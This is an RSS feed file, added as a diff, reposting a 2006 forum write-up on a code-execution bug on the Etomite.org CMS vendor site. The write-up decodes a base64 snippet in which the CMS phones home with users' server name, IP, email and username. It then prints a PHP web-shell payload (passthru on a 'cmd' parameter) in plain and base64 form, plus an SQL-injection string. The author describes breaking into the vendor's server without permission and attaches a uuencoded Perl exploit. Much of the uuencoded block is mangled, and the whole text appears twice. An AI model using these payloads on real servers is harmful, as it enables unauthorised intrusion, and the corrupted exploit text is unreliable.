@@ -1,0 +1,360 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Blind Exicution Attack</title>
+    <link>https://forum.moparisthebest.com/t/blind-exicution-attack/13600</link>
+    <description>The Etomite.org Blind Execution Attack
+
+Copyright © 2006 cijfer &lt;cijfer@netti!fi&gt;
+All rights reserved.
+
+Table of Contents
+
+1 About this paper
+2 My curiosity
+3 The vulnerable code
+4 Greets
+
+1 About this paper
+
+The following paper was written to allow curious readers to
+fully understand my mystery pertaining to a random discovery
+within Etomite.org and the CMS software they distribute. The
+reason that i wrote this, was because of the fact that the
+bug itself was not within the CMS, but found randomly in
+the vendor website through their modified version of the
+CMS.
+
+2 My curiosity
+
+My purpose was just to look for vulnerabilities. It is at
+the moment January 10 2006. I had to choose which CMS i
+wanted to audit. At random, i chose Etomite CMS. Unlike
+the other CMS sytems, Etomite&#39;s was quite confusing. Not
+the PHP itself, but the fact that its functions were within
+functions within functions, and their use of a cache system.
+Not to mention a large amount of base64 encoded functions and
+such.
+
+I was just looking through various files, until i stumbled
+on a file containing a small amount of base64 code. It is
+my instinct to of course decode the base64 using a simple
+online base64 decoder.
+
+File: &#39;manager/includes/settings.inc.php&#39;
+
+++ Base64 Encoded ++
+eval(base64_decode(&quot;ZWNobyAiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFz
+Y3JpcHQnPnRvcC5kb2N1bWVudC5sb2NhdGlvbi5ocmVmPSdodHRwOi8vd3d3
+LmV0b21pdGUub3JnL2xpY2Vuc2U/cz0iLmJhc2U2NF9lbmNvZGUoJF9TRVJW
+RVJbJ1NFUlZFUl9OQU1FJ10pLiImaT0iLmJhc2U2NF9lbmNvZGUoJF9TRVNT
+SU9OWydpcCddKS4iJmU9Ii5iYXNlNjRfZW5jb2RlKCRfU0VTU0lPTlsnZW1h
+aWwnXSkuIiZjczE9Ii4kX1NFU1NJT05bJ3ZhbGlkJ10uIiZjczI9Ii4kX1NF
+U1NJT05bJ3VzZXInXS4iJmNzMz0iLmJhc2U2NF9lbmNvZGUoJEdMT0JBTFNb
+ImZ1bGxfYXBwbmFtZSJdKS4iJzs8L3NjcmlwdD4iOw==&quot;));
+
+++ Base64 Decoded ++
+echo &quot;&lt;script type=&#39;text/javascript&#39;&gt;
+top.document.location.href=&#39;http://www.etomite.org/license?
+s=&quot;.base64_encode($_SERVER[&#39;SERVER_NAME&#39;]).&quot;
+&amp;i=&quot;.base64_encode($_SESSION[&#39;ip&#39;]).&quot;
+&amp;e=&quot;.base64_encode($_SESSION[&#39;email&#39;]).&quot;
+&amp;cs1=&quot;.$_SESSION[&#39;valid&#39;].&quot;&amp;cs2=&quot;.$_SESSION[&#39;user&#39;].&quot;
+&amp;cs3=&quot;.base64_encode($GLOBALS[&quot;full_appname&quot;]).&quot;&#39;;
+&lt;/script&gt;&quot;;
+
+This led me to believe that the CMS basically logged their
+downloaders/users for their servers hostname, the persons IP
+address, email address, username, and name/version of the CMS
+they were using.
+
+As a joke, i decided to visit the page with my own values in
+the variables. I set the &#39;s&#39; variable with the following
+to attempt to create an SQL error if possible:
+
+&#39; OR &#39;a&#39;=&#39;a&#39;
+
+The other variables, i had just set their values to 1. After
+setting them and viewing the page, i realized that i had
+forgotten to base64 encode my input. To further advance my
+joke, i encoded the following in base64:
+
+++ Base64 Decoded ++
+&lt;?passthru($_GET[cmd]);die();?&gt;
+
+++ Base64 Encoded ++
+PD9wYXNzdGhydSgkX0dFVFtjbWRdKTtkaWUoKTs/Pg==
+
+After filling in every variable except &#39;s&#39; with my base64
+encoded PHP code, to my surprise, i had encountered the
+following error on the page:
+
+PHP error debug
+Error: passthru(): Cannot execute a blank command
+Error type/ Nr.: Warning - 2
+File: /home/xxx/public_html/index.php(414) : eval()&#39;d code
+Line: 22
+
+Mitä vittua??? Did it just say what i think it just said...
+Indeed, it apparently tried to execute a command using my
+encoded PHP code. But how? Is this even a bug within the CMS?
+I kept asking myself questions and then decided to write a
+small exploit in Perl against this bug. It was to be used
+only against the CMS website (PoC will be included at the end
+of this paper).
+
+After getting inside, i tried to just look through all their
+PHP files to see if i could figure out _why_ it did what it
+did. So i looked.
+
+3 The vulnerable code
+
+After looking at it for around 45 minutes, i began getting a
+bit annoyed. I had to traceback function after function and
+then finally came across one function which had something
+interesting:
+
+function outputContent() {
+...
+// Check to see if document content contains PHP tags.
+// PHP tag support contributed by SniperX
+if( (preg_match(&quot;/(&lt;?php|&lt;?)(.*?)?&gt;/&quot;, $documentOutput))
+&amp;&amp; ($type == &quot;text/html&quot;) &amp;&amp; ($this-&gt;allow_embedded_php) )
+{
+$documentOutput = &#39;?&#39;.&#39;&gt;&#39; . $documentOutput . &#39;&lt;&#39;.&#39;?php &#39;;
+// Parse the PHP tags.
+eval($documentOutput);
+}
+...
+
+Do you see it? Through all of the functions, it came down to
+the value of $documentOutput (which was the base64 encoded
+data i passed through each variable). These variables were
+apparently also sent through a MySQL query, which i figured
+out after decoding more base64 data. This is why i got the
+MySQL errors. But, in order to trigger the command execution,
+i had to create an error. This led me back and forth until i
+realized that it was &#39;outputContent&#39; which was the problem.
+
+Any person fluent in PHP knows of the eval() function. It
+basically evaluates PHP code. In other words, doing the
+following will execute the PHP code as if they were between
+the angled brackets (&lt;? and ?&gt;)
+
+eval(&quot;passthru(&#39;id&#39;);&quot;);
+
+This led me to believe that it was the eval() call in the
+outputContent function that had made my code get executed. I
+did not realize that it was the problem, because of the fact
+i had used angled brackets in my query. I overlooked the code
+where outputContent parses out the angled brackets. I thank
+my friend ReZEN for showing that out for me. I was focused on
+eval(), haha.
+
+Before i conclude this paper, i have not concluded whether or
+not the actual distributable CMS is vulnerable to this. It
+may or may not be, but i will let other people do that work
+or maybe i will do that in the distant future.[br][size=1]Posted at: September 09, 2006, 09:26:02 AM[/size][hr]4 Greets
+
+ReZEN (http://www.xorcrew.net)
+for pointing out the PHP code which parsed out the angled
+brackets, which led to the conclusion of why the PHP code was
+able to get parsed by eval().
+
+begin 644 cijfer-kikkeli.pl
+M(R$O=7-R+V)I;B]P97)L&quot;B,*(R!%=&amp;]M:71E+F]R9R!%;&amp;ET92!%&gt;&#39;!L;VETz
+M&quot;B,*(R!#;W!Y&lt;FEG:&#39;0@*&amp;,I(#(P,#8@8VEJ9F5R(#QC:6IF97) ;F5T=&amp;DNy
+M9FD^&quot;B,@06QL(&#39;)I9VAT&lt;R!R97-E&lt;G9E9&quot;X*(PHC($5T;VUI=&amp;4N;W)G(&#39;-Tx
+M:6YK&lt;RP@86YD(&#39;-O(&amp;1O97,@=&amp;AE:7(@;&amp;%M92!#35,N&quot;B,*(R D260Z(&amp;-Iw
+M:F9E&lt;BUK:6MK96QI+G!L+&#39;8@,&quot;XQ(#(P,#8O,#$O,3 @,# Z,#DZ-#@@8VEJv
+M9F5R($5X&lt;&quot;!C:6IF97(@) H*=7-E($Q74#HZ57-E&lt;D%G96YT.PIU&lt;V4@55))u
+M.CI%&lt;V-A&lt;&amp;4[&quot;G5S92!&#39;971O&lt;&#39;0Z.DQO;F&lt;[&quot;G5S92!497)M.CI!3E-)0V]Lt
+M;W([&quot;@HD:&amp;]S=&quot; ](&quot;)H=&#39;1P.BO=W=W+F5T;VUI=&amp;4N;W)G(CL*&quot;G=H:6QEs
+M*&quot;D*&gt;PH)&lt;&#39;)I;G0@8V]L;W(H(F=R965N(BDL(&quot;)C:6IF97)&lt;)&quot; B+&quot;!C;VQOr
+M&lt;B@B&lt;F5S970B*3L*&quot;6-H;VUP*&quot;1C;VUM86YD(#T@/%-41$E./BD[&quot;@EE&gt;&amp;ETq
+M(&#39;5N;&amp;5S&lt;R D8V]M;6%N9#L*&quot;29E&gt;&#39;!L;VET*&quot;1C;VUM86YD*3L*?0H*&lt;W5Bp
+M(&amp;5X&lt;&amp;QO:70*&gt;PH))&amp;-I:CU,5U Z.E5S97)!9V5N=&quot;T^;F5W*&quot;D@;W(@9&amp;EEo
+M.PH))&amp;-I:BT^86=E;G0H(DUO&gt;FEL;&amp;$O-2XP(&quot;A8,3$[(%4[($QI;G5X(&amp;DVn
+M.#8[(&amp;9I+49).R!R=CHR+C I($=E8VMO+S(P,#8P,3 Q(BD[&quot;@DD8VEJ+3YPm
+M&lt;F]X&gt;2@B:&#39;1T&lt;&quot;(L(&quot;)H=&#39;1P.BO(BXD=&#39;5N;F5L+B(O(BD@=6YL97-S(&quot;$Dl
+M=&#39;5N;F5L.PH*&quot;21S=&#39;)I;F&lt;@(#T@(F5C:&amp;E,C!?8VEJ9F5R7R4S0B([&quot;@DDk
+M&lt;W1R:6YG(&quot;X](&#39;5R:5]E&lt;V-A&lt;&amp;4H&lt;VAI9G0I.PH))&#39;-T&lt;FEN9R N/2 cool.gif3-&quot;j
+M96-H;R4R,%]C:6IF97)?(CL*&quot;@DD;W5T/21C:6HM/F=E=&quot;@D:&amp;]S=&quot;XB+VQIi
+M8V5N&lt;V4_&lt;SU*&gt;4)056E!;EE38SE*,D5N)FD],29E/3$F8W,Q/3$F8W,R/3$Fh
+M8W,S/5!$.7=96$YZ9$=H&gt;6139VM8,&amp;1&amp;5D9T:F%7&lt;&amp;1+5&#39;1K85=5;TM4&lt;R]0g
+M9ST])F-I:CTB+B1S=&#39;)I;F&lt;I.PH*&quot;6EF*&quot;1O=70M/FES7W-U8V-E&lt;W,I&quot;@E[f
+M&quot;@D)0&amp;-I:CUS&lt;&amp;QI=&quot;@B7V-I:F9E&lt;EB+&quot;1O=70M/F-O;G1E;G0I.PH)&quot;7!Re
+&lt;:6YT(&#39;-U8G-T&lt;BA 8VEJ6S%=+#$I.PH)?0I]&quot;G0Md
+c
+end[quote]
+i do not take credit for this tut
+
+taken from:http://www.blitzmodz.com/forums/index.php?showtopic=2641</description>
+    
+    <lastBuildDate>Sat, 09 Sep 2006 19:27:11 +0000</lastBuildDate>
+    <category>General Discussion</category>
+    <atom:link href="https://forum.moparisthebest.com/t/blind-exicution-attack/13600.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Blind Exicution Attack</title>
+        <dc:creator><![CDATA[@jonckr jonckr]]></dc:creator>
+        <description><![CDATA[
+          <p><a href="https://forum.moparisthebest.com/u/jonckr">@jonckr</a> wrote:</p>
+          <blockquote>
+              <p>The <a href="http://Etomite.org" rel="nofollow noopener">Etomite.org</a> Blind Execution Attack</p>
+<p>Copyright © 2006 cijfer &lt;cijfer@netti!fi&gt;<br>
+All rights reserved.</p>
+<p>Table of Contents</p>
+<p>1 About this paper<br>
+2 My curiosity<br>
+3 The vulnerable code<br>
+4 Greets</p>
+<p>1 About this paper</p>
+<p>The following paper was written to allow curious readers to<br>
+fully understand my mystery pertaining to a random discovery<br>
+within <a href="http://Etomite.org" rel="nofollow noopener">Etomite.org</a> and the CMS software they distribute. The<br>
+reason that i wrote this, was because of the fact that the<br>
+bug itself was not within the CMS, but found randomly in<br>
+the vendor website through their modified version of the<br>
+CMS.</p>
+<p>2 My curiosity</p>
+<p>My purpose was just to look for vulnerabilities. It is at<br>
+the moment January 10 2006. I had to choose which CMS i<br>
+wanted to audit. At random, i chose Etomite CMS. Unlike<br>
+the other CMS sytems, Etomite’s was quite confusing. Not<br>
+the PHP itself, but the fact that its functions were within<br>
+functions within functions, and their use of a cache system.<br>
+Not to mention a large amount of base64 encoded functions and<br>
+such.</p>
+<p>I was just looking through various files, until i stumbled<br>
+on a file containing a small amount of base64 code. It is<br>
+my instinct to of course decode the base64 using a simple<br>
+online base64 decoder.</p>
+<p>File: ‘manager/includes/settings.inc.php’</p>
+<p>++ Base64 Encoded ++<br>
+eval(base64_decode(“ZWNobyAiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFz<br>
+Y3JpcHQnPnRvcC5kb2N1bWVudC5sb2NhdGlvbi5ocmVmPSdodHRwOi8vd3d3<br>
+LmV0b21pdGUub3JnL2xpY2Vuc2U/cz0iLmJhc2U2NF9lbmNvZGUoJF9TRVJW<br>
+RVJbJ1NFUlZFUl9OQU1FJ10pLiImaT0iLmJhc2U2NF9lbmNvZGUoJF9TRVNT<br>
+SU9OWydpcCddKS4iJmU9Ii5iYXNlNjRfZW5jb2RlKCRfU0VTU0lPTlsnZW1h<br>
+aWwnXSkuIiZjczE9Ii4kX1NFU1NJT05bJ3ZhbGlkJ10uIiZjczI9Ii4kX1NF<br>
+U1NJT05bJ3VzZXInXS4iJmNzMz0iLmJhc2U2NF9lbmNvZGUoJEdMT0JBTFNb<br>
+ImZ1bGxfYXBwbmFtZSJdKS4iJzs8L3NjcmlwdD4iOw==”));</p>
+<p>++ Base64 Decoded ++<br>
+echo "";</p>
+<p>This led me to believe that the CMS basically logged their<br>
+downloaders/users for their servers hostname, the persons IP<br>
+address, email address, username, and name/version of the CMS<br>
+they were using.</p>
+<p>As a joke, i decided to visit the page with my own values in<br>
+the variables. I set the ‘s’ variable with the following<br>
+to attempt to create an SQL error if possible:</p>
+<p>’ OR ‘a’=‘a’</p>
+<p>The other variables, i had just set their values to 1. After<br>
+setting them and viewing the page, i realized that i had<br>
+forgotten to base64 encode my input. To further advance my<br>
+joke, i encoded the following in base64:</p>
+<p>++ Base64 Decoded ++</p>
+&lt;?passthru($_GET[cmd]);die();?&gt;
+<p>++ Base64 Encoded ++<br>
+PD9wYXNzdGhydSgkX0dFVFtjbWRdKTtkaWUoKTs/Pg==</p>
+<p>After filling in every variable except ‘s’ with my base64<br>
+encoded PHP code, to my surprise, i had encountered the<br>
+following error on the page:</p>
+<p>PHP error debug<br>
+Error: passthru(): Cannot execute a blank command<br>
+Error type/ Nr.: Warning - 2<br>
+File: /home/xxx/public_html/index.php(414) : eval()'d code<br>
+Line: 22</p>
+<p>Mitä vittua??? Did it just say what i think it just said…<br>
+Indeed, it apparently tried to execute a command using my<br>
+encoded PHP code. But how? Is this even a bug within the CMS?<br>
+I kept asking myself questions and then decided to write a<br>
+small exploit in Perl against this bug. It was to be used<br>
+only against the CMS website (PoC will be included at the end<br>
+of this paper).</p>
+<p>After getting inside, i tried to just look through all their<br>
+PHP files to see if i could figure out <em>why</em> it did what it<br>
+did. So i looked.</p>
+<p>3 The vulnerable code</p>
+<p>After looking at it for around 45 minutes, i began getting a<br>
+bit annoyed. I had to traceback function after function and<br>
+then finally came across one function which had something<br>
+interesting:</p>
+<p>function outputContent() {<br>
+…<br>
+// Check to see if document content contains PHP tags.<br>
+// PHP tag support contributed by SniperX<br>
+if( (preg_match("/(&lt;?php|&lt;?)(.*?)?&gt;/", $documentOutput))<br>
+&amp;&amp; ($type == “text/html”) &amp;&amp; ($this-&gt;allow_embedded_php) )<br>
+{<br>
+$documentOutput = ‘?’.’&gt;’ . $documentOutput . ‘&lt;’.’?php ';<br>
+// Parse the PHP tags.<br>
+eval($documentOutput);<br>
+}<br>
+…</p>
+<p>Do you see it? Through all of the functions, it came down to<br>
+the value of $documentOutput (which was the base64 encoded<br>
+data i passed through each variable). These variables were<br>
+apparently also sent through a MySQL query, which i figured<br>
+out after decoding more base64 data. This is why i got the<br>
+MySQL errors. But, in order to trigger the command execution,<br>
+i had to create an error. This led me back and forth until i<br>
+realized that it was ‘outputContent’ which was the problem.</p>
+<p>Any person fluent in PHP knows of the eval() function. It<br>
+basically evaluates PHP code. In other words, doing the<br>
+following will execute the PHP code as if they were between<br>
+the angled brackets (&lt;? and ?&gt;)</p>
+<p>eval(“passthru(‘id’);”);</p>
+<p>This led me to believe that it was the eval() call in the<br>
+outputContent function that had made my code get executed. I<br>
+did not realize that it was the problem, because of the fact<br>
+i had used angled brackets in my query. I overlooked the code<br>
+where outputContent parses out the angled brackets. I thank<br>
+my friend ReZEN for showing that out for me. I was focused on<br>
+eval(), haha.</p>
+<p>Before i conclude this paper, i have not concluded whether or<br>
+not the actual distributable CMS is vulnerable to this. It<br>
+may or may not be, but i will let other people do that work<br>
+or maybe i will do that in the distant future.[br][size=1]Posted at: September 09, 2006, 09:26:02 AM[/size][hr]4 Greets</p>
+<p>ReZEN (<a href="http://www.xorcrew.net" rel="nofollow noopener">http://www.xorcrew.net</a>)<br>
+for pointing out the PHP code which parsed out the angled<br>
+brackets, which led to the conclusion of why the PHP code was<br>
+able to get parsed by eval().</p>
+<p>begin 644 cijfer-kikkeli.pl<br>
+M(R$O=7-R+V)I;B]P97)L"B,<em>(R!%=&amp;]M:71E+F]R9R!%;&amp;ET92!%&gt;’!L;VETz<br>
+M"B,</em>(R!#;W!Y&lt;FEG:‘0@<em>&amp;,I(#(P,<span class="hashtag">#8</span>@8VEJ9F5R(<span class="hashtag">#QC:6IF97</span>) ;F5T=&amp;DNy<br>
+M9FD^"B,<span class="mention">@06QL</span>(’)I9VAT&lt;R!R97-E&lt;G9E9"X</em>(PHC($5T;VUI=&amp;4N;W)G(’-Tx<br>
+M:6YK&lt;RP@86YD(’-O(&amp;1O97,@=&amp;AE:7(@;&amp;%M92!<span class="hashtag">#35</span>,N"B,<em>(R D260Z(&amp;-Iw<br>
+M:F9E&lt;BUK:6MK96QI+G!L+'8@,“XQ(#(P,<span class="hashtag">#8O</span>,#$O,3 @,# Z,<span class="hashtag">#DZ-</span>#@<span class="mention">@8VEJv</span><br>
+M9F5R($5X&lt;”!C:6IF97(@) H</em>=7-E($Q74#HZ57-E&lt;D%G96YT.PIU&lt;V4@55))u<br>
+M.CI%&lt;V-A&lt;&amp;4<a>"G5S92!'971O&lt;'0Z.DQO;F&lt;[“G5S92!497)M.CI!3E-)0V]Lt<br>
+M;W([”@HD:&amp;]S=" </a>H=‘1P.BO=W=W+F5T;VUI=&amp;4N;W)G(CL*"G=H:6QEs<br>
+M*"D*&gt;PH)&lt;’)I;G0@8V]L;W(H(F=R965N(BDL(")C:6IF97)&lt;)" B+"!C;VQOr<br>
+M&lt;B@B&lt;F5S970B<em>3L</em>"6-H;VUP*“1C;VUM86YD(<span class="hashtag">#T</span>@/%-41$E./BD[”@EE&gt;&amp;ETq<br>
+M(‘5N;&amp;5S&lt;R D8V]M;6%N9#L*"29E&gt;’!L;VET*“1C;VUM86YD<em>3L</em>?0H*&lt;W5Bp<br>
+M(&amp;5X&lt;&amp;QO:70*&gt;PH))&amp;-I:CU,5U Z.E5S97)!9V5N=“T^;F5W*“D@;W(<span class="mention">@9</span>&amp;EEo<br>
+M.PH))&amp;-I:BT^86=E;G0H(DUO&gt;FEL;&amp;$O-2XP(“A8,3$[(%4[($QI;G5X(&amp;DVn<br>
+M.<span class="hashtag">#8</span>[(&amp;9I+49).R!R=CHR+C I($=E8VMO+S(P,<span class="hashtag">#8P</span>,3 Q(BD[”@DD8VEJ+3YPm<br>
+M&lt;F]X&gt;2@B:'1T&lt;”(L(”)H='1P.BO(BXD='5N;F5L+B(O(BD@=6YL97-S(”$Dl<br>
+M=‘5N;F5L.PH*"21S=’)I;F&lt;@(<span class="hashtag">#T</span>@(F5C:&amp;E,C!?8VEJ9F5R7R4S0B(<a>"@DDk<br>
+M&lt;W1R:6YG("X</a>)’-T&lt;FEN9R N/2 cool.gif3-“j<br>
+M96-H;R4R,%]C:6IF97)?(CL*”<span class="mention">@DD</span>;W5T/21C:6HM/F=E="<span class="mention">@D</span>:&amp;]S=“XB+VQIi<br>
+M8V5N&lt;V4_&lt;SU*&gt;4)056E!;EE38SE*,D5N)FD],29E/3$F8W,Q/3$F8W,R/3$Fh<br>
+M8W,S/5!$.7=96$YZ9$=H&gt;6139VM8,&amp;1&amp;5D9T:F%7&lt;&amp;1+5’1K85=5;TM4&lt;R]0g<br>
+M9ST])F-I:CTB+B1S=’)I;F&lt;I.PH*“6EF*“1O=70M/FES7W-U8V-E&lt;W,I”<span class="mention">@E</span>[f<br>
+M”<span class="mention">@D</span>)0&amp;-I:CUS&lt;&amp;QI=”<span class="mention">@B7V-I</span>:F9E&lt;EB+"1O=70M/F-O;G1E;G0I.PH)"7!Re<br>
+&lt;:6YT(’-U8G-T&lt;BA 8VEJ6S%=+#$I.PH)?0I]"G0Md<br>
+c<br>
+end[quote]<br>
+i do not take credit for this tut</p>
+<p>taken from:<a href="http://www.blitzmodz.com/forums/index.php?showtopic=2641" rel="nofollow noopener">http://www.blitzmodz.com/forums/index.php?showtopic=2641</a></p>
+          </blockquote>
+          <p><a href="https://forum.moparisthebest.com/t/blind-exicution-attack/13600/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://forum.moparisthebest.com/t/blind-exicution-attack/13600/1</link>
+        <pubDate>Sat, 09 Sep 2006 19:27:11 +0000</pubDate>
+        <guid isPermaLink="false">forum.moparisthebest.com-post-13600-1</guid>
+        <source url="https://forum.moparisthebest.com/t/blind-exicution-attack/13600.rss">Blind Exicution Attack</source>
+      </item>
+  </channel>
+</rss>
